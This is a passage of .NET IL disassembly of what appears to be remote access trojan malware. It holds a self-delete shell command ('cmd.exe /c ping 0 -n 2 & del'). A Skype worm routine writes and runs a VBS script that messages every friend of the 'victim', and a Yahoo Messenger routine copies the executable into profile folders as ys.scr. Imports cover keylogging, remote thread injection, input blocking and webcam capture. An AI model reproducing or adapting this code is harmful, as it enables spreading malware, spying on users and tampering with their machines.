    catch [mscorlib]System.Exception 
    {
      IL_0172:  dup
      IL_0173:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0178:  stloc.s    V_8
      IL_017a:  nop
      IL_017b:  ldloc.s    V_8
      IL_017d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0182:  nop
      IL_0183:  ldloc.s    V_8
      IL_0185:  stloc.s    V_9
      IL_0187:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_018c:  nop
      IL_018d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0192:  leave.s    IL_0194

    }  // end handler
    IL_0194:  nop
    IL_0195:  nop
    .try
    {
      IL_0196:  ldstr      "cmd.exe /c ping 0 -n 2 & del \""
      IL_019b:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_01a0:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_01a5:  ldstr      "\""
      IL_01aa:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_01af:  ldc.i4.0
      IL_01b0:  ldc.i4.0
      IL_01b1:  ldc.i4.m1
      IL_01b2:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_01b7:  pop
      IL_01b8:  leave.s    IL_01dc

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01ba:  dup
      IL_01bb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01c0:  stloc.s    V_10
      IL_01c2:  nop
      IL_01c3:  ldloc.s    V_10
      IL_01c5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01ca:  nop
      IL_01cb:  ldloc.s    V_10
      IL_01cd:  stloc.s    V_11
      IL_01cf:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01d4:  nop
      IL_01d5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01da:  leave.s    IL_01dc

    }  // end handler
    IL_01dc:  nop
    IL_01dd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_01e2:  nop
    IL_01e3:  nop
    IL_01e4:  ret
  } // end of method OK::UNS

  .method public static uint8[]  ZIP(uint8[] B) cil managed
  {
    // Code size       120 (0x78)
    .maxstack  4
    .locals init (uint8[] V_0,
             uint8[] V_1,
             int32 V_2,
             class [System]System.IO.Compression.GZipStream V_3,
             class [mscorlib]System.IO.MemoryStream V_4,
             uint8[] V_5)
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor(uint8[])
    IL_0007:  stloc.s    V_4
    IL_0009:  ldloc.s    V_4
    IL_000b:  ldc.i4.0
    IL_000c:  newobj     instance void [System]System.IO.Compression.GZipStream::.ctor(class [mscorlib]System.IO.Stream,
                                                                                       valuetype [System]System.IO.Compression.CompressionMode)
    IL_0011:  stloc.3
    IL_0012:  ldc.i4.4
    IL_0013:  newarr     [mscorlib]System.Byte
    IL_0018:  stloc.1
    IL_0019:  ldloc.s    V_4
    IL_001b:  ldloc.s    V_4
    IL_001d:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
    IL_0022:  ldc.i4.5
    IL_0023:  conv.i8
    IL_0024:  sub.ovf
    IL_0025:  callvirt   instance void [mscorlib]System.IO.MemoryStream::set_Position(int64)
    IL_002a:  nop
    IL_002b:  ldloc.s    V_4
    IL_002d:  ldloc.1
    IL_002e:  ldc.i4.0
    IL_002f:  ldc.i4.4
    IL_0030:  callvirt   instance int32 [mscorlib]System.IO.MemoryStream::Read(uint8[],
                                                                               int32,
                                                                               int32)
    IL_0035:  pop
    IL_0036:  ldloc.1
    IL_0037:  ldc.i4.0
    IL_0038:  call       int32 [mscorlib]System.BitConverter::ToInt32(uint8[],
                                                                      int32)
    IL_003d:  stloc.2
    IL_003e:  ldloc.s    V_4
    IL_0040:  ldc.i4.0
    IL_0041:  conv.i8
    IL_0042:  callvirt   instance void [mscorlib]System.IO.MemoryStream::set_Position(int64)
    IL_0047:  nop
    IL_0048:  ldloc.2
    IL_0049:  ldc.i4.1
    IL_004a:  sub.ovf
    IL_004b:  ldc.i4.1
    IL_004c:  add.ovf
    IL_004d:  ldc.i4.1
    IL_004e:  sub.ovf
    IL_004f:  ldc.i4.1
    IL_0050:  add.ovf
    IL_0051:  newarr     [mscorlib]System.Byte
    IL_0056:  stloc.0
    IL_0057:  ldloc.3
    IL_0058:  ldloc.0
    IL_0059:  ldc.i4.0
    IL_005a:  ldloc.2
    IL_005b:  callvirt   instance int32 [System]System.IO.Compression.GZipStream::Read(uint8[],
                                                                                       int32,
                                                                                       int32)
    IL_0060:  pop
    IL_0061:  ldloc.3
    IL_0062:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
    IL_0067:  nop
    IL_0068:  ldloc.s    V_4
    IL_006a:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
    IL_006f:  nop
    IL_0070:  ldloc.0
    IL_0071:  stloc.s    V_5
    IL_0073:  br.s       IL_0075

    IL_0075:  ldloc.s    V_5
    IL_0077:  ret
  } // end of method OK::ZIP

  .method public static pinvokeimpl("user32" winapi) 
          int16  GetAsyncKeyState(valuetype [System.Windows.Forms]System.Windows.Forms.Keys xxx) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("user32" nomangle ansi lasterr winapi) 
          int32  EnumWindows(class j.OK/CallBack Adress,
                             int32 y) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("user32.dll" nomangle ansi lasterr winapi) 
          bool  IsWindowVisible(native int hwnd) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("User32" winapi) 
          int32  ShowWindowe(int32 hwnd,
                             int32 nCmdShow) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32" as "GetWindowTextA" nomangle ansi lasterr winapi) 
          int32  GetWindowText(int32 hwnd,
                               string&  marshal( byvalstr) lpWindowText,
                               int32 cch) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("kernel32.dll" nomangle ansi lasterr winapi) 
          native int  OpenThread(class ThreadAccess_ dwDesiredAccess,
                                 bool bInheritHandle,
                                 uint32 dwThreadId) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("kernel32.dll" nomangle ansi lasterr winapi) 
          uint32  SuspendThread(native int hThread) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("kernel32.dll" nomangle ansi lasterr winapi) 
          uint32  ResumeThread(native int hThread) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("kernel32.dll" nomangle ansi lasterr winapi) 
          bool  CloseHandle(native int hHandle) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32" nomangle ansi lasterr winapi) 
          int64  BlockInput(int64 fBlock) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32" as "SystemParametersInfoA" nomangle ansi lasterr winapi) 
          int32  SystemParametersInfo(int32 uAction,
                                      int32 uParam,
                                      string&  marshal( byvalstr) lpvParam,
                                      int32 fuWinIni) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("winmm.dll" as "mciSendStringA" nomangle ansi lasterr winapi) 
          int64  mciSendString_(string&  marshal( byvalstr) Command,
                                string&  marshal( byvalstr) ReturnString,
                                int64 ReturnLength,
                                int64 hWnd) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32" nomangle ansi lasterr winapi) 
          int32  ShowWindow(native int handle,
                            int32 nCmdShow) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("user32.dll" nomangle ansi lasterr winapi) 
          int32  GetAsyncKeyState(int32 key) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("winmm.dll" as "mciSendStringA" nomangle ansi lasterr winapi) 
          int32  mmciSendString(string&  marshal( byvalstr) lpstrCommand,
                                string&  marshal( byvalstr) lpstrReturnString,
                                int32 uReturnLength,
                                int32 hwndCallback) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("shell32.dll" as "SHEmptyRecycleBinA" nomangle ansi lasterr winapi) 
          int32  SHEmptyRecycleBin(int32 hWnd,
                                   string&  marshal( byvalstr) pszRootPath,
                                   int32 dwFlags) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("shell32.dll" nomangle ansi lasterr winapi) 
          int32  SHUpdateRecycleBinIcon() cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32" nomangle ansi lasterr winapi) 
          native int  GetForegroundWindow() cil managed preservesig
  {
  }
  .method public static pinvokeimpl("user32" as "BlockInput" nomangle ansi lasterr winapi) 
          int32  apiBlockInput(int32 fBlock) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("user32" nomangle ansi lasterr winapi) 
          int64  SwapMouseButton(int64 bSwap) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" autochar lasterr winapi) 
          void  SendMessage(int32 hWnd,
                            uint32 msg,
                            uint32 wParam,
                            int32 lparam) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32" nomangle ansi lasterr winapi) 
          int32  SetWindowPos(int32 hwnd,
                              int32 hWndInsertAfter,
                              int32 x,
                              int32 y,
                              int32 cx,
                              int32 cy,
                              int32 wFlags) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32" as "FindWindowA" nomangle ansi lasterr winapi) 
          int32  FindWindow(string&  marshal( byvalstr) lpClassName,
                            string&  marshal( byvalstr) lpWindowName) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("winmm.dll" as "mciSendStringA" nomangle ansi lasterr winapi) 
          int64  mciSendString(string&  marshal( byvalstr) lpCommandString,
                               string&  marshal( byvalstr) lpReturnString,
                               int64 uReturnLength,
                               int64 hwndCallback) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32" autochar lasterr winapi) 
          int32  GetWindowText(native int hWnd,
                               class [mscorlib]System.Text.StringBuilder lpString,
                               int32 cch) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("user32.dll" nomangle ansi lasterr winapi) 
          native int  SendMessageW(native int hWnd,
                                   int32 Msg,
                                   native int wParam,
                                   native int lParam) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32" as "SendMessageA" nomangle ansi lasterr winapi) 
          int32  SendCamMessage(int32 hwnd,
                                int32 Msg,
                                int32 wParam,
                                object  marshal( as any) lParam) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("kernel32" as "LoadLibraryA" nomangle ansi lasterr winapi) 
          int32  LoadLibrary(string&  marshal( byvalstr) lpLibFileName) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("kernel32" nomangle ansi lasterr winapi) 
          int32  GetProcAddress(int32 hModule,
                                string&  marshal( byvalstr) lpProcName) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("kernel32" nomangle ansi lasterr winapi) 
          int32  CreateRemoteThread(int32 hProcess,
                                    int32 lpThreadAttributes,
                                    int32 dwStackSize,
                                    int32 lpStartAddress,
                                    int32 lpParameter,
                                    int32 dwCreationFlags,
                                    int32& lpThreadId) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("ntdll.dll" nomangle ansi lasterr winapi) 
          int64  RtlCreateUserThread(int64 hProcess,
                                     int32& ThreadSecurityDescriptor,
                                     int64 CreateSuspended,
                                     int64 ZeroBits,
                                     int64 MaximumStackSize,
                                     int64 CommittedStackSize,
                                     int64 StartAddress,
                                     int64 Parameter,
                                     int64& hThread,
                                     valuetype j.OK/CLIENT_ID& ClientId) cil managed preservesig
  {
  }
  .method private static string  RN(int32 p1) cil managed
  {
    // Code size       9 (0x9)
    .maxstack  1
    .locals init (string V_0)
    IL_0000:  nop
    IL_0001:  newobj     instance void [mscorlib]System.NotImplementedException::.ctor()
    IL_0006:  throw

    IL_0007:  ldloc.0
    IL_0008:  ret
  } // end of method OK::RN

  .method private static uint8[]  ZIP(uint8[] p1,
                                      bool p2) cil managed
  {
    // Code size       9 (0x9)
    .maxstack  1
    .locals init (uint8[] V_0)
    IL_0000:  nop
    IL_0001:  newobj     instance void [mscorlib]System.NotImplementedException::.ctor()
    IL_0006:  throw

    IL_0007:  ldloc.0
    IL_0008:  ret
  } // end of method OK::ZIP

  .property instance int32 IWin32Window(string,
                                        string)
  {
    .get instance int32 j.OK::get_IWin32Window(string,
                                               string)
    .set instance void j.OK::set_IWin32Window(string,
                                              string,
                                              int32)
  } // end of property OK::IWin32Window
  .property object NomeSpreadDiscoLocal()
  {
    .set void j.OK::set_NomeSpreadDiscoLocal(object)
    .get object j.OK::get_NomeSpreadDiscoLocal()
  } // end of property OK::NomeSpreadDiscoLocal
  .property instance object CultureInfo_()
  {
    .get instance object j.OK::get_CultureInfo_()
    .set instance void j.OK::set_CultureInfo_(object)
  } // end of property OK::CultureInfo_
} // end of class j.OK

.class private auto ansi sealed SKYYPE
       extends [mscorlib]System.Object
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.StandardModuleAttribute::.ctor() = ( 01 00 00 00 ) 
  .method public static void  Skype() cil managed
  {
    // Code size       177 (0xb1)
    .maxstack  3
    .locals init (class [mscorlib]System.IO.FileInfo V_0,
             class [mscorlib]System.IO.StreamWriter V_1,
             class [mscorlib]System.IO.FileStream V_2,
             class [mscorlib]System.Exception V_3)
    IL_0000:  nop
    IL_0001:  nop
    .try
    {
      IL_0002:  ldstr      "C:\\windows\\system32\\s4c.vbs"
      IL_0007:  ldc.i4.2
      IL_0008:  ldc.i4.2
      IL_0009:  newobj     instance void [mscorlib]System.IO.FileStream::.ctor(string,
                                                                               valuetype [mscorlib]System.IO.FileMode,
                                                                               valuetype [mscorlib]System.IO.FileAccess)
      IL_000e:  stloc.2
      IL_000f:  ldloc.2
      IL_0010:  newobj     instance void [mscorlib]System.IO.StreamWriter::.ctor(class [mscorlib]System.IO.Stream)
      IL_0015:  stloc.1
      IL_0016:  ldloc.1
      IL_0017:  callvirt   instance class [mscorlib]System.IO.Stream [mscorlib]System.IO.StreamWriter::get_BaseStream()
      IL_001c:  ldc.i4.0
      IL_001d:  conv.i8
      IL_001e:  ldc.i4.2
      IL_001f:  callvirt   instance int64 [mscorlib]System.IO.Stream::Seek(int64,
                                                                           valuetype [mscorlib]System.IO.SeekOrigin)
      IL_0024:  pop
      IL_0025:  ldloc.1
      IL_0026:  ldstr      "on error resume next"
      IL_002b:  callvirt   instance void [mscorlib]System.IO.TextWriter::WriteLine(string)
      IL_0030:  nop
      IL_0031:  ldloc.1
      IL_0032:  ldstr      "set Fruxr = WScript.CreateObject(\"Skype4COM.Skype\""
      + ", \"Skype_\")"
      IL_0037:  callvirt   instance void [mscorlib]System.IO.TextWriter::WriteLine(string)
      IL_003c:  nop
      IL_003d:  ldloc.1
      IL_003e:  ldstr      "Fruxr.Client.Start()"
      IL_0043:  callvirt   instance void [mscorlib]System.IO.TextWriter::WriteLine(string)
      IL_0048:  nop
      IL_0049:  ldloc.1
      IL_004a:  ldstr      "Fruxr.Attach()"
      IL_004f:  callvirt   instance void [mscorlib]System.IO.TextWriter::WriteLine(string)
      IL_0054:  nop
      IL_0055:  ldloc.1
      IL_0056:  ldstr      "For Each KZN In Fruxr.Friends"
      IL_005b:  callvirt   instance void [mscorlib]System.IO.TextWriter::WriteLine(string)
      IL_0060:  nop
      IL_0061:  ldloc.1
      IL_0062:  ldstr      "Fruxr.SendMessage KZN.handle,\"Remplacer ici par le"
      + " texte que vous voulez (ce texte sera ecrit dans toutes les conversatio"
      + "ns de tout les amis skype de la victime\""
      IL_0067:  callvirt   instance void [mscorlib]System.IO.TextWriter::WriteLine(string)
      IL_006c:  nop
      IL_006d:  ldloc.1
      IL_006e:  ldstr      "next"
      IL_0073:  callvirt   instance void [mscorlib]System.IO.TextWriter::WriteLine(string)
      IL_0078:  nop
      IL_0079:  ldloc.1
      IL_007a:  callvirt   instance void [mscorlib]System.IO.StreamWriter::Close()
      IL_007f:  nop
      IL_0080:  ldstr      "C:\\windows\\system32\\s4c.vbs"
      IL_0085:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
      IL_008a:  pop
      IL_008b:  ldstr      "C:\\windows\\system32\\s4c.vbs"
      IL_0090:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
      IL_0095:  stloc.0
      IL_0096:  ldloc.0
      IL_0097:  callvirt   instance void [mscorlib]System.IO.FileInfo::Delete()
      IL_009c:  nop
      IL_009d:  leave.s    IL_00ae

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_009f:  dup
      IL_00a0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00a5:  stloc.3
      IL_00a6:  nop
      IL_00a7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00ac:  leave.s    IL_00ae

    }  // end handler
    IL_00ae:  nop
    IL_00af:  nop
    IL_00b0:  ret
  } // end of method SKYYPE::Skype

} // end of class SKYYPE

.class private auto ansi sealed yahooo
       extends [mscorlib]System.Object
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.StandardModuleAttribute::.ctor() = ( 01 00 00 00 ) 
  .method public static void  yahoo_sp() cil managed noinlining nooptimization
  {
    // Code size       438 (0x1b6)
    .maxstack  3
    .locals init (string V_0,
             string V_1,
             class [mscorlib]System.Reflection.Module V_2,
             int32 V_3,
             string[] V_4,
             int32 V_5,
             int32 V_6,
             int32 V_7,
             int32 V_8,
             int32 V_9,
             bool V_10,
             bool V_11,
             int32 V_12)
    IL_0000:  nop
    .try
    {
      IL_0001:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0006:  ldc.i4.s   -2
      IL_0008:  stloc.s    V_7
      IL_000a:  ldc.i4.2
      IL_000b:  stloc.s    V_9
      IL_000d:  call       class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Assembly::GetExecutingAssembly()
      IL_0012:  callvirt   instance class [mscorlib]System.Reflection.Module[] [mscorlib]System.Reflection.Assembly::GetModules()
      IL_0017:  ldc.i4.0
      IL_0018:  ldelem.ref
      IL_0019:  stloc.2
      IL_001a:  ldc.i4.3
      IL_001b:  stloc.s    V_9
      IL_001d:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
      IL_0022:  stloc.1
      IL_0023:  ldc.i4.4
      IL_0024:  stloc.s    V_9
      IL_0026:  ldstr      "C:\\Documents and Settings\\"
      IL_002b:  ldstr      "USERNAME"
      IL_0030:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_0035:  ldstr      "\\Local Settings\\Application Data\\Yahoo Messenger\\"
      IL_003a:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_003f:  stloc.0
      IL_0040:  ldc.i4.5
      IL_0041:  stloc.s    V_9
      IL_0043:  ldloc.0
      IL_0044:  ldc.i4.s   16
      IL_0046:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.FileSystem::Dir(string,
                                                                                               valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.FileAttribute)
      IL_004b:  ldstr      ""
      IL_0050:  ldc.i4.0
      IL_0051:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0056:  ldc.i4.0
      IL_0057:  ceq
      IL_0059:  ldc.i4.0
      IL_005a:  ceq
      IL_005c:  stloc.s    V_10
      IL_005e:  ldloc.s    V_10
      IL_0060:  brfalse    IL_0100

      IL_0065:  ldc.i4.6
      IL_0066:  stloc.s    V_9
      IL_0068:  ldc.i4.0
      IL_0069:  stloc.3
      IL_006a:  ldc.i4.7
      IL_006b:  stloc.s    V_9
      IL_006d:  ldc.i4.0
      IL_006e:  stloc.s    V_5
      IL_0070:  ldc.i4.8
      IL_0071:  stloc.s    V_9
      IL_0073:  ldloc.0
      IL_0074:  call       string[] [mscorlib]System.IO.Directory::GetDirectories(string)
      IL_0079:  stloc.s    V_4
      IL_007b:  ldc.i4.s   9
      IL_007d:  stloc.s    V_9
      IL_007f:  ldc.i4.0
      IL_0080:  ldloc.s    V_4
      IL_0082:  ldc.i4.0
      IL_0083:  callvirt   instance int32 [mscorlib]System.Array::GetUpperBound(int32)
      IL_0088:  stloc.s    V_6
      IL_008a:  stloc.3
      IL_008b:  br.s       IL_00f7

      IL_008d:  ldc.i4.s   10
      IL_008f:  stloc.s    V_9
      IL_0091:  ldloc.s    V_4
      IL_0093:  ldloc.3
      IL_0094:  ldelem.ref
      IL_0095:  ldc.i4.s   16
      IL_0097:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.FileSystem::Dir(string,
                                                                                               valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.FileAttribute)
      IL_009c:  ldstr      ""
      IL_00a1:  ldc.i4.0
      IL_00a2:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_00a7:  ldc.i4.0
      IL_00a8:  ceq
      IL_00aa:  ldc.i4.0
      IL_00ab:  ceq
      IL_00ad:  stloc.s    V_10
      IL_00af:  ldloc.s    V_10
      IL_00b1:  brfalse.s  IL_00ed

      IL_00b3:  ldc.i4.s   11
      IL_00b5:  stloc.s    V_9
      IL_00b7:  ldloc.s    V_4
      IL_00b9:  ldloc.3
      IL_00ba:  ldelem.ref
      IL_00bb:  ldstr      "\\ys.scr"
      IL_00c0:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_00c5:  call       bool [mscorlib]System.IO.File::Exists(string)
      IL_00ca:  ldc.i4.0
      IL_00cb:  ceq
      IL_00cd:  stloc.s    V_11
      IL_00cf:  ldloc.s    V_11
      IL_00d1:  brfalse.s  IL_00ec

      IL_00d3:  ldc.i4.s   12
      IL_00d5:  stloc.s    V_9
      IL_00d7:  ldloc.1
      IL_00d8:  ldloc.s    V_4
      IL_00da:  ldloc.3
      IL_00db:  ldelem.ref
      IL_00dc:  ldstr      "\\ys.scr"
      IL_00e1:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_00e6:  call       void [mscorlib]System.IO.File::Copy(string,
                                                               string)
      IL_00eb:  nop
      IL_00ec:  nop
      IL_00ed:  nop
      IL_00ee:  ldc.i4.s   15
      IL_00f0:  stloc.s    V_9
      IL_00f2:  nop
      IL_00f3:  ldloc.3
      IL_00f4:  ldc.i4.1
      IL_00f5:  add.ovf
      IL_00f6:  stloc.3
      IL_00f7:  ldloc.3
      IL_00f8:  ldloc.s    V_6
      IL_00fa:  stloc.s    V_12
      IL_00fc:  ldloc.s    V_12
      IL_00fe:  ble.s      IL_008d

      IL_0100:  nop
      IL_0101:  leave      IL_01ab

      IL_0106:  ldloc.s    V_8
      IL_0108:  br.s       IL_010e

      IL_010a:  ldloc.s    V_8
      IL_010c:  ldc.i4.1
      IL_010d:  add
      IL_010e:  ldc.i4.0
      IL_010f:  stloc.s    V_8
      IL_0111:  switch     ( 
                            IL_015e,
                            IL_0001,
                            IL_000a,
                            IL_001a,
                            IL_0023,
                            IL_0040,
                            IL_0065,
                            IL_006a,
                            IL_0070,
                            IL_007b,
                            IL_008d,
                            IL_00b3,
                            IL_00d3,
                            IL_00ec,
                            IL_00ed,
                            IL_00ee,
                            IL_0100,
                            IL_0101)
      IL_015e:  leave.s    IL_01a0

      IL_0160:  ldloc.s    V_9
      IL_0162:  stloc.s    V_8
      IL_0164:  ldloc.s    V_7
      IL_0166:  ldc.i4.s   -2
      IL_0168:  bgt.s      IL_016d

      IL_016a:  ldc.i4.1
      IL_016b:  br.s       IL_016f

      IL_016d:  ldloc.s    V_7
      IL_016f:  switch     ( 
                            IL_017c,
                            IL_010a)
      IL_017c:  leave.s    IL_01a0

    }  // end .try
    filter
    {
      IL_017e:  isinst     [mscorlib]System.Exception
      IL_0183:  ldnull
      IL_0184:  cgt.un
      IL_0186:  ldloc.s    V_7
      IL_0188:  ldc.i4.0
      IL_0189:  cgt.un
      IL_018b:  and
      IL_018c:  ldloc.s    V_8
      IL_018e:  ldc.i4.0
      IL_018f:  ceq
      IL_0191:  and
      IL_0192:  endfilter
    }  // end filter
    {  // handler
      IL_0194:  castclass  [mscorlib]System.Exception
      IL_0199:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_019e:  leave.s    IL_0160

    }  // end handler
    IL_01a0:  ldc.i4     0x800a0033
    IL_01a5:  call       class [mscorlib]System.Exception [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::CreateProjectError(int32)
    IL_01aa:  throw

    IL_01ab:  nop
    IL_01ac:  ldloc.s    V_8
    IL_01ae:  brfalse.s  IL_01b5

    IL_01b0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
    IL_01b5:  ret
  } // end of method yahooo::yahoo_sp

} // end of class yahooo

.class private auto ansi ThreadAccess_
       extends [mscorlib]System.Object
{
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerNonUserCodeAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       9 (0x9)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  nop
    IL_0007:  nop
    IL_0008:  ret
  } // end of method ThreadAccess_::.ctor

} // end of class ThreadAccess_


// =============================================================

// *********** DISASSEMBLY COMPLETE ***********************
// WARNING: Created Win32 resource file C:\Users\ROOT\Desktop\j.res
